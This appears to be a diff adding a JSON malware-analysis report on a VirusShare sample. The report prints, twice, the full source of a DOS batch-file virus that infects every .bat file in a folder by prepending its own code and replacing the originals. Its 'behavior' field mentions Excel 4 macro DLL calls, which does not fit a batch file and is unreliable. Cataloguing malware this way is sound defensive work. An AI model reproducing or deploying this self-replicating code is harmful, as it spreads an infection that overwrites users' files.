@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@ECHO OFF %Hd%\nREM  Created by Hadez (DS)\nREM  Creates temp file which will be the infector\nFind \"Hq\" <%0.bat >> Hd.bat\nFor  %%f in (*.bat) do Call Hd %0.bat %%f\nDEL  HD.bat\nGOTO Hd\n\nREM  Infection routine All this routine should have the second flag\nREM  Receives the host's name and the file to infect as parameter\nFind \"Hd\" %2 > NUL %Hq%\nIF   NOT ERRORLEVEL 1 GOTO Quit %HdHq%\nFind \"Hd\" %1 >> Temp.bat %Hq%\nType %2 >> Temp.bat %HqHd%\nDEL  %2 %HqHd%\nRENAME Temp.bat %2 %HqHd%\n:Quit%HqHd%\n \nREM  The Host's code will be in here!\n:Hd\nECHO ON %Hd%"
+    },
+    "filename": "VirusShare_83f586d0154e6c73f86fd12faddba3b6",
+    "filesize": 568,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "83f586d0154e6c73f86fd12faddba3b6",
+        "sha1": "7e199bd2d9b178323bd243f3f7c3e2dbec939ede",
+        "sha256": "9875f3b8eb059338c77ebb8c7e3a143143d634ec043a1940759958b63a9ab61d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ECHO OFF %Hd%",
+            "REM  Created by Hadez (DS)",
+            "REM  Creates temp file which will be the infector",
+            "Find \"Hq\" <%0.bat >> Hd.bat",
+            "For  %%f in (*.bat) do Call Hd %0.bat %%f",
+            "DEL  HD.bat",
+            "GOTO Hd",
+            "REM  Infection routine All this routine should have the second flag",
+            "REM  Receives the host's name and the file to infect as parameter",
+            "Find \"Hd\" %2 > NUL %Hq%",
+            "IF   NOT ERRORLEVEL 1 GOTO Quit %HdHq%",
+            "Find \"Hd\" %1 >> Temp.bat %Hq%",
+            "Type %2 >> Temp.bat %HqHd%",
+            "DEL  %2 %HqHd%",
+            "RENAME Temp.bat %2 %HqHd%",
+            ":Quit%HqHd%",
+            "REM  The Host's code will be in here!",
+            "ECHO ON %Hd%"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.303116",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
